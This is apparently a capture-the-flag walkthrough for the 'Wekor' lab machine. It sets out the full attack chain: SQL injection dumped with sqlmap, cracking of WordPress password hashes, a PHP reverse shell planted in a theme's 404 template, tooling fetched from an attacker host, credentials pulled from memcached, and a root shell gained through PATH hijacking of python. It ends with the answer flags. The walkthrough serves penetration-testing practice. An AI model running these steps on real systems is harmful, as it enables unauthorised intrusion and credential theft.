# Wekor - Medium

```shell
sudo vim /etc/hosts
#map ip to wekor.thm

nmap -T4 -p- -A -Pn -v wekor.thm

feroxbuster -u http://wekor.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

sudo wfuzz -c -f sub-fighter -u "http://wekor.thm" -H "Host: FUZZ.wekor.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50

sudo wfuzz -c -f sub-fighter -u "http://wekor.thm" -H "Host: FUZZ.wekor.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 --hh 23

sudo vim /etc/hosts
#add site.wekor.thm

feroxbuster -u http://site.wekor.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

cmseek
#check wordpress directory

#capture the coupon code input request
#save request to a file
sqlmap -r it_cart.req --dbs

sqlmap -r it_cart.req -D wordpress --dump-all

#dump table with hashes
sqlmap -r it_cart.req -D wordpress --dump -T wp_users

#crack hashes
hashcat -a 0 -m 400 hashes.txt /usr/share/wordlists/kaonashi.txt

#log into wordpress
#and use 404 template to get reverse shell

nc -nvlp 4444
#we get reverse shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

#in attacker machine
python3 -m http.server

#in reverse shell
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#check internal services
ss -ltnp

#from Hacktricks
echo "version" | nc -vn -w 1 127.0.0.1 11211

echo "stats slabs" | nc -vn -w 1 127.0.0.1 11211

echo "stats items" | nc -vn -w 1 127.0.0.1 11211

echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211
#gives key names

echo "get username" | nc -vn -w 1 127.0.0.1 11211

echo "get password" | nc -vn -w 1 127.0.0.1 11211
#now we have creds for Orka

su Orka

#get user flag

sudo -l

cat /home/Orka/Desktop/bitcoin
#this contains the password in plaintext

cat /home/Orka/Desktop/transfer.py
#script for bitcoin program

sudo /home/Orka/Desktop/bitcoin
#using password, we can run this program
#to transfer bitcoins

cat /home/Orka/Desktop/bitcoin
#go through program strings again

echo $PATH

#check for writable paths
ls -ld /usr/local/sbin

ls -ld /usr/sbin
#Orka can write in this directory

which python

echo $PATH
#/usr/sbin is mentioned first

echo '#!/bin/bash
/bin/bash' > /usr/sbin/python

chmod +x /usr/sbin/python

sudo /home/Orka/Desktop/bitcoin
#we get root shell this time
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18

* Now, we can begin with web directory enumeration - the webpage does not contain anything of use.

* However, using ```feroxbuster```, we find a directory /comingreallysoon.

* This directory points us to /it-next, which is a webpage for a IT company.

* We also have /robots.txt file, and it includes multiple disallowed entries, but these directories do not lead anywhere.

* Furthermore, /it-next includes directories such as /images, /css, and /js - but it does not have anything useful.

* We can begin with subdomain enumeration using ```wfuzz``` - ensure the false positive results are removed using ```--hh``` flag.

* This gives us a subdomain 'site' - so we can add this to our /etc/hosts file.

* Now, <site.wekor.thm> includes a message by 'Jim', and it says that after 2 weeks the website would be completed.

* Here, we can check for hidden directories - ```feroxbuster``` gives us the directory /wordpress.

* This directory contains a blog page for 'Wekor' - but it does not contain any blogs for now.

* Using ```cmseek```, we find out that this is WordPress v5.6, it uses theme 'twentytwentyone'; it also finds username 'admin'.

* Now, the given clue shows that there is SQL injection involved, so we can attempt to use ```sqlmap``` tool, but first we have to check for vulnerable pages.

* Going back to the /it-next page, we can see that there are multiple pages to discover.

* We can check for pages which accept user input as SQLi is easier to look for in user inputs.

* Now, in the 'Shopping Cart' page in /it-next, there is an input box which accepts coupon codes.

* If we use the basic SQLi payload ```' or 1=1--``` here, we get an SQL error.

* We can use ```sqlmap``` to check if any data can be extracted.

* Firstly, we will have to capture the POST request to the coupon code input using ```Burp Suite```; then the request has to be saved to a file.

* This request file has to be fed to ```sqlmap``` for checking SQLi.

* ```sqlmap``` uses SQLi to give us 6 databases - but the 'wordpress' database is of interest.

* Using ```dump-all``` flag we get too much data; we can only look at 'wp-users' table for password hashes.

* This gives us password hashes for four users - wp_yura, wp_eagle, wp_jeffrey, and admin.

* We can crack the wordpress hashes using ```hashcat```.

* We manage to crack 3 out of 4 passwords - so we have passwords for all users except 'admin'.

* We can navigate to <site.wekor.thm/wordpress/wp-login.php> and attempt to login using the 3 creds we found.

* We can login successfully as any user - we can now access the dashboard.

* Now, we can get reverse shell by injecting PHP reverse-shell code in the 404 page on 'Theme Editor', and update the 404 template.

* Then, after setting up a listener, we need to visit the link <site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php> to activate the reverse-shell.

* We get reverse shell as www-data user.

* For enumeration, we can use ```linpeas.sh```

* ```linpeas``` finds the 'wp-config.php' and it has creds "root:root123@#59".

* We can check for password-reuse - SSH login as 'Orka' or 'root' does not work in this case.

* Checking internal services using ```ss -ltnp```, we can view that various ports are open and listening.

* One of the ports, 11211, is odd as it is not common to see a higher port listening.

* Googling for port 11211 shows that it could be running ```memcache```.

* ```HackTricks``` covers pentesting port 11211 - we can refer the commands from that page.

* Using those commands, we are able to get items 'username' and 'password' from ```memcache```.

* We can now use these creds to login as Orka.

* Using ```sudo -l```, we can see that we can run a 'bitcoin' program as root.

* Checking the contents of the 'bitcoin' program, we can see that it contains the password required in plaintext.

* Running the program as sudo and using the required password, we can see that it is a program for bitcoins transfer.

* We also have a Python script in the same directory; reading its contents shows that this Python program is used for 'bitcoins' program.

* Reading through the contents of the 'bitcoins' binary, we can see that it uses a relative path for 'python':

  ```python /home/Orka/Desktop/transfer.py```

* We can attempt for Python hijacking here, but we will first have to check for writable paths.

* Using ```ls -ld```, we can see that /usr/sbin is writable, and 'python' binary is situated in /usr/bin

* Checking the PATH variable, we can see that /usr/sbin has higher priority, so we can create a malicious 'python' program in this path for privesc.

* Now, if we run the 'bitcoin' program as sudo, we get root shell.

```markdown
1. What is the user flag? - 1a26a6d51c0172400add0e297608dec6

2. What is the root flag? - f4e788f87cc3afaecbaf0f0fe9ae6ad7
```
